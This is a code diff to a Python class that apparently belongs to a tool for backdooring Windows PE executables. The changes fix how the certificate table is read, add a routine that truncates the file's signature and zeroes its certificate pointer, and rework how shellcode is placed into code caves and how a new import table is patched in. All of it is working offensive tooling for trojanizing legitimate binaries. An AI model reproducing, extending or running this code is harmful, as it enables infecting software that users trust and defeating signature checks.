@@ -253,8 +253,8 @@ class pebin():
         self.flItms['ResourceTable'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['ExceptionTable'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['CertTableLOC'] = self.binary.tell()
-        self.flItms['CertificateTable'] = struct.unpack('<Q', self.binary.read(8))[0]
-
+        self.flItms['CertLOC'] = struct.unpack("<I", self.binary.read(4))[0]
+        self.flItms['CertSize'] = struct.unpack("<I", self.binary.read(4))[0]
         self.flItms['BaseReLocationTable'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['Debug'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['Architecture'] = struct.unpack('<Q', self.binary.read(8))[0]  # zero
@@ -659,7 +659,7 @@ class pebin():
             self.flItms['NewSectionName'] = "." + self.flItms['SectionName']
             self.flItms['newSectionFlags'] = int('C0000040', 16)
             #get file size
-            filesize = os.stat(self.flItms['filename']).st_size
+            filesize = os.stat(self.flItms['backdoorfile']).st_size
             if filesize > self.flItms['SizeOfImage']:
                 print "[!] File has extra data after last section, cannot add new section"
                 return False
@@ -1531,6 +1531,19 @@ class pebin():
 
         return True
 
+    def remove_signing(self):
+        """
+        Zero cert table and truncate binary
+        """
+        if self.ZERO_CERT is True and self.flItms['CertLOC'] != 0:
+            with open(self.flItms['backdoorfile'], "r+b") as self.binary:
+                self.gather_file_info_win()
+                print "[*] Overwriting certificate table pointer"
+                self.binary.seek(-self.flItms['CertSize'], os.SEEK_END)
+                self.binary.truncate()
+                self.binary.seek(self.flItms['CertTableLOC'], 0)
+                self.binary.write("\x00\x00\x00\x00\x00\x00\x00\x00")
+
     def patch_pe(self):
 
         """
@@ -1587,6 +1600,9 @@ class pebin():
         self.flItms['backdoorfile'] = self.OUTPUT
         shutil.copy2(self.FILE, self.flItms['backdoorfile'])
 
+        #Removing the cert is better early on
+        self.remove_signing()
+
         if 'apis_needed' in self.flItms:
             self.check_apis(self.FILE)
             iat_result = ''
@@ -1597,9 +1613,20 @@ class pebin():
                 iat_result = self.patch_in_new_iat()
                 print "[*] Checking updated IAT for thunks"
                 self.check_apis(self.flItms['backdoorfile'])
-            if iat_result is False or self.flItms['neededAPIs'] != set():
-                #reset the file
+
+            # if this IDT_IN_CAVE is true and it did not work... reset and go normal route
+            if self.flItms['neededAPIs'] != set() and self.flItms['IDT_IN_CAVE'] is True:
+                print "[!] Resetting the file"
                 shutil.copy2(self.FILE, self.flItms['backdoorfile'])
+                self.remove_signing()
+                iat_result = self.create_new_iat()
+                if iat_result is False:
+                    return False
+                print "[*] Checking updated IAT for thunks"
+                self.check_apis(self.flItms['backdoorfile'])
+
+            if self.flItms['neededAPIs'] != set() and self.flItms['IDT_IN_CAVE'] is False:
+                #reset the file
                 iat_result = self.create_new_iat()
                 if iat_result is False:
                     return False
@@ -1731,12 +1758,6 @@ class pebin():
                 if i == 0:
                     self.binary.seek(int(self.flItms['CavesPicked'][i][1], 16))
                     self.binary.write(self.flItms['completeShellcode'])
-
-        #Patch certTable
-        if self.ZERO_CERT is True and self.flItms['CertificateTable'] != 0:
-            print "[*] Overwriting certificate table pointer"
-            self.binary.seek(self.flItms['CertTableLOC'], 0)
-            self.binary.write("\x00\x00\x00\x00\x00\x00\x00\x00")
 
         self.binary.close()
 
